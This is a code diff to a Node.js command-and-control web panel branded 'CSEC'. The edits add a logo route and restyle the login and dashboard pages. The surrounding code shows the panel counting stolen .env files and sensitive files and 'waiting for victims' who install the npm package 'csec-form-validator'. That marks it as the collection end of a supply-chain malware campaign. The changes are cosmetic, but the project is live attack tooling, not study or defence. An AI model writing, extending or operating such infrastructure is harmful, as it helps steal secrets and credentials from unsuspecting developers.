@@ -147,6 +147,15 @@ http.createServer(async (req, res) => {
     return;
   }
 
+  if (req.url === '/logo.png' && req.method === 'GET') {
+    const fp = path.join(__dirname, 'logo.png');
+    if (fs.existsSync(fp)) {
+      const data = fs.readFileSync(fp);
+      res.writeHead(200, { 'Content-Type': 'image/png', 'Content-Length': data.length, 'Cache-Control': 'public, max-age=86400' }).end(data);
+    } else { res.writeHead(404).end(); }
+    return;
+  }
+
   if (req.url === '/alert.m4a' && req.method === 'GET') {
     const fp = path.join(__dirname, 'alert.m4a');
     if (fs.existsSync(fp)) {
@@ -168,6 +177,7 @@ function loginPage(err) {
 body{font-family:'JetBrains Mono','Fira Code',monospace;background:#080808;color:#ccc;min-height:100vh;display:flex;align-items:center;justify-content:center}
 .login{background:#0d0d0d;border:1px solid #f8514933;border-radius:12px;padding:2.5rem;width:340px;animation:si .4s}
 @keyframes si{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
+.login .logo{width:80px;height:80px;border-radius:50%;margin:0 auto 1rem;display:block}
 .login h1{color:#f85149;font-size:1rem;text-align:center;margin-bottom:.4rem;display:flex;align-items:center;justify-content:center;gap:8px}
 .login .sub{color:#444;font-size:.7rem;text-align:center;margin-bottom:1.5rem}
 .login input{width:100%;background:#111;border:1px solid #222;color:#ccc;padding:10px 14px;border-radius:6px;font-family:inherit;font-size:.85rem;outline:none;transition:border .2s}
@@ -177,7 +187,8 @@ body{font-family:'JetBrains Mono','Fira Code',monospace;background:#080808;color
 .err{color:#f85149;font-size:.72rem;text-align:center;margin-top:.8rem}
 </style></head><body>
 <form class="login" method="POST" action="/login">
-<h1>&#x1f480; C2 Access</h1>
+<img src="/logo.png" alt="CSEC" class="logo">
+<h1>C2 Access</h1>
 <div class="sub">Enter password to continue</div>
 <input type="password" name="password" placeholder="Password" autofocus required>
 <button type="submit">Unlock</button>
@@ -193,7 +204,8 @@ function dashboard() {
 *{margin:0;padding:0;box-sizing:border-box}
 body{font-family:'JetBrains Mono','Fira Code',monospace;background:#080808;color:#ccc;min-height:100vh}
 .bar{background:linear-gradient(90deg,#1a0000,#080808);border-bottom:2px solid #f8514933;padding:14px 20px;display:flex;justify-content:space-between;align-items:center}
-.bar h1{color:#f85149;font-size:1rem;display:flex;align-items:center;gap:8px}
+.bar h1{color:#f85149;font-size:1rem;display:flex;align-items:center;gap:10px}
+.bar h1 img{width:32px;height:32px;border-radius:50%}
 .bar .live{display:flex;align-items:center;gap:6px;font-size:.75rem;color:#8b949e}
 .bar .dot{width:8px;height:8px;border-radius:50%;background:#3fb950;animation:p 1.5s infinite}
 @keyframes p{0%,100%{opacity:1}50%{opacity:.3}}
@@ -203,7 +215,8 @@ body{font-family:'JetBrains Mono','Fira Code',monospace;background:#080808;color
 .st .v{font-size:1.8rem;font-weight:700;color:#f85149}
 .st .l{font-size:.68rem;color:#666;text-transform:uppercase;letter-spacing:.06em;margin-top:4px}
 .empty{text-align:center;padding:5rem 2rem;color:#444}
-.empty .icon{font-size:3rem;margin-bottom:1rem}
+.empty .icon{margin-bottom:1rem}
+.empty .icon img{width:80px;height:80px;border-radius:50%;opacity:.6}
 .card{background:#0d0d0d;border:1px solid #f8514933;border-radius:10px;margin-bottom:1rem;overflow:hidden;animation:si .4s}
 @keyframes si{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:translateY(0)}}
 .ch{background:#111;padding:12px 18px;border-bottom:1px solid #f8514922;display:flex;justify-content:space-between;align-items:center}
@@ -225,7 +238,7 @@ body{font-family:'JetBrains Mono','Fira Code',monospace;background:#080808;color
 .nt{font-size:.78rem;color:#666;padding:2px 0}
 </style></head><body>
 <div class="bar">
-<h1>&#x1f480; C2 Command &amp; Control</h1>
+<h1><img src="/logo.png" alt="CSEC"> C2 Command &amp; Control</h1>
 <div class="live"><span class="dot"></span>LISTENING :${PORT}</div>
 </div>
 <div class="wrap">
@@ -235,7 +248,7 @@ body{font-family:'JetBrains Mono','Fira Code',monospace;background:#080808;color
 <div class="st"><div class="v" id="nE">0</div><div class="l">.env Files</div></div>
 <div class="st"><div class="v" id="nF">0</div><div class="l">Sensitive Files</div></div>
 </div>
-<div id="feed"><div class="empty"><div class="icon">&#x1f4e1;</div>Waiting for victims...<br><small style="color:#333">They just need to run: npm install csec-form-validator</small></div></div>
+<div id="feed"><div class="empty"><div class="icon"><img src="/logo.png" alt="CSEC"></div>Waiting for victims...<br><small style="color:#333">They just need to run: npm install csec-form-validator</small></div></div>
 </div>
 <script>
 function esc(s){if(!s)return'-';var d=document.createElement('div');d.textContent=String(s);return d.innerHTML;}
